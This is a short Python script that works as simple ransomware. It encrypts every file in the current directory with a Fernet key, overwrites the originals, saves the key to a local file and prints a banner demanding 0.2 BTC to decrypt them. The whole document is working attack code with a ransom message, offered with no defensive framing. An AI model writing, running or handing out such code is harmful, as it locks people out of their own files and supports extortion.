import os
from cryptography.fernet import Fernet

files = []

# adding all files in the current directory to an array to encrypt
for file in os.listdir():
	# add the files to encrypt except these files
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	# only add files and not directories
	if os.path.isfile(file):
		files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypted)

print(""" ________________________________________________________
|							 |
|							 |
|	You have been hacked and all of your Files	 |
|	have been encrypted. Send me 0.2 BTC to get	 |
|		the Key to decrypt them.		 |
|							 |
|________________________________________________________|
""")
